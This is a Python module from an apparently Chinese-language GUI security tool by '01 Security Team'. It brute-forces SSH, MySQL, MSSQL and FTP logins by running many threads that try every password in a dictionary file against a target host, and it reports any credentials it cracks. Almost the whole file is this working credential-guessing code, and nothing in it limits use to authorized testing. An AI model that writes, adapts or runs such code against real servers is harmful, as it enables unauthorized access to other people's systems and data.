#!/usr/bin/env python
# -*- coding: UTF-8 -*-
"""
Copyright (c) 2017 01 Security Team
Its Support Mysql、Mssql、ssh
"""

import time, queue, threading
from .util import *

import tkinter.messagebox
from ftplib import FTP

q_pwds = None
_crack_len = 0

_crack_flag = threading.Event()  # 用于暂停线程的标识
_crack_flag.set()  # 将flag设置为True
_crack_running = threading.Event()  # 用于停止线程的标识
_crack_running.set()  # 将running设置为True
_crack_lock = threading.Lock()


# 根据下拉框改变默认端口
def change_cbox(event, type, ports):
    if type == 'ssh':
        ports.set(22)
    elif type == 'mysql':
        ports.set(3306)
    elif type == 'mssql':
        ports.set(1433)
    elif type == 'ftp':
        ports.set(21)
    elif type == 'rdp':
        ports.set(3389)
    else:
        return


# 点击开始爆破事件
def crack_port(type, ipaddrs, ports, threads, name, filename, btn_crack, crack_result, pbar_crack):
    if not ipaddrs or not ports or not name:
        tkinter.messagebox.showinfo('01sec', 'input')
        return
    global q_pwds
    global _crack_len
    global _crack_flag
    global _crack_running
    if type == 'ftp':
        # 获取密码 queue格式
        q_pwds = get_dict(filename)
        _crack_flag.set()
        _crack_running.set()
        pbar_crack['maximum'] = q_pwds.qsize()
        _crack_len = 0
        btn_crack['state'] = DISABLED
        crack_result.delete('0.0', END)
        for i in range(threads):
            t = threading.Thread(target=crack_ftp, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
            t.start()
    elif type == 'mysql':
        try:
            global pymysql
            import pymysql
        except:
            tkinter.messagebox.showinfo('01sec', '需安装pymysql模块')
            return
        q_pwds = get_dict(filename)
        _crack_flag.set()
        _crack_running.set()
        pbar_crack['maximum'] = q_pwds.qsize()
        _crack_len = 0
        btn_crack['state'] = DISABLED
        crack_result.delete('0.0', END)
        for i in range(threads):
            t = threading.Thread(target=crack_mysql, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
            t.start()
    elif type == 'ssh':
        try:
            global paramiko
            import paramiko
        except:
            tkinter.messagebox.showinfo('01sec', '需安装paramiko模块')
            return
        q_pwds = get_dict(filename)
        _crack_flag.set()
        _crack_running.set()
        pbar_crack['maximum'] = q_pwds.qsize()
        _crack_len = 0
        btn_crack['state'] = DISABLED
        crack_result.delete('0.0', END)
        for i in range(threads):
            t = threading.Thread(target=crack_ssh, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
            t.start()
    elif type == 'mssql':
        try:
            global pymssql
            import pymssql
        except:
            tkinter.messagebox.showinfo('01sec', '需安装pymssql模块')
            return
        q_pwds = get_dict(filename)
        _crack_flag.set()
        _crack_running.set()
        pbar_crack['maximum'] = q_pwds.qsize()
        _crack_len = 0
        btn_crack['state'] = DISABLED
        crack_result.delete('0.0', END)
        for i in range(threads):
            t = threading.Thread(target=crack_mssql, args=(ipaddrs, ports, name, q_pwds, crack_result, pbar_crack))
            t.start()
    elif type == 'rdp':
        tkinter.messagebox.showinfo('01sec', '功能正在研发......')
    else:
        return


def crack_ssh(ipaddrs, port, name, pwd, crack_result, pbar_crack):
    ssh = paramiko.SSHClient()
    while _crack_running.isSet():
        while not pwd.empty():
            try:
                _crack_flag.wait()
                temp_pwd = pwd.get().replace('\n', '')
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ipaddrs, int(port), name, temp_pwd)
                ssh.close()
                result = '[*]INFO：爆破成功' + '>' * 20 + '用户名为：' + name + '  ' + '密码为：' + temp_pwd
                crack_result.insert(END, result + '\n')
                return
            except Exception as e:
                print(e)
                pass
            finally:
                if _crack_lock.acquire():
                    global _crack_len
                    _crack_len = _crack_len + 1
                    pbar_crack['value'] = _crack_len
                    _crack_lock.release()


def crack_mysql(ipaddrs, port, name, pwd, crack_result, pbar_crack):
    while _crack_running.isSet():
        while not pwd.empty():
            try:
                _crack_flag.wait()
                temp_pwd = pwd.get().replace('\n', '')
                db = pymysql.connect(str(ipaddrs), int(port), name, temp_pwd)
                db.close()
                result = '[*]INFO：爆破成功' + '>' * 20 + '用户名为：' + name + '  ' + '密码为：' + temp_pwd
                crack_result.insert(END, result + '\n')
                return
            except Exception as e:
                print(e)
                pass
            finally:
                if _crack_lock.acquire():
                    global _crack_len
                    _crack_len = _crack_len + 1
                    pbar_crack['value'] = _crack_len
                    _crack_lock.release()


def crack_mssql(ipaddrs, port, name, pwd, crack_result, pbar_crack):
    while _crack_running.isSet():
        while not pwd.empty():
            try:
                _crack_flag.wait()
                temp_pwd = pwd.get().replace('\n', '')
                db = pymssql.connect(str(ipaddrs), int(port), name, temp_pwd)
                db.close()
                result = '[*]INFO：爆破成功' + '>' * 20 + '用户名为：' + name + '  ' + '密码为：' + temp_pwd
                crack_result.insert(END, result + '\n')
                return
            except Exception as e:
                print(e)
                pass
            finally:
                if _crack_lock.acquire():
                    global _crack_len
                    _crack_len = _crack_len + 1
                    pbar_crack['value'] = _crack_len
                    _crack_lock.release()


def crack_ftp(ipaddrs, port, name, pwd, crack_result, pbar_crack):
    ftp = FTP()
    while _crack_running.isSet():
        while not pwd.empty():
            try:
                _crack_flag.wait()

                ftp.connect(str(ipaddrs), int(port), 5)
                temp_pwd = pwd.get().replace('\n', '')
                ftp.login(name, temp_pwd)
                # a = ftp.retrlines('ls')
                # print(a)
                ftp.quit()
                result = '[*]INFO：爆破成功' + '>' * 20 + '用户名为：' + name + '  ' + '密码为：' + temp_pwd
                crack_result.insert(END, result + '\n')
                return
            except Exception as e:
                print(e)
                pass
            finally:
                if _crack_lock.acquire():
                    global _crack_len
                    _crack_len = _crack_len + 1
                    pbar_crack['value'] = _crack_len
                    _crack_lock.release()


def pause_port_crack(event, btn_crack_pause):
    global _crack_flag
    global _crack_running
    state = btn_crack_pause['text']
    if state == '暂停':
        btn_crack_pause['text'] = '继续'
        _crack_flag.clear()  # 设置为False, 让线程阻塞
    elif state == '继续':
        btn_crack_pause['text'] = '暂停'
        _crack_flag.set()  # 设置为True, 让线程停止阻塞


def stop_port_crack(event, btn_crack, btn_crack_pause):
    global _crack_running
    global _crack_flag
    global q_pwds

    _crack_flag.set()  # 将线程从暂停状态恢复, 如何已经暂停的话
    time.sleep(0.01)
    q_pwds.queue.clear()
    _crack_running.clear()  # 设置为False
    btn_crack['state'] = NORMAL
    btn_crack_pause['text'] = '暂停'
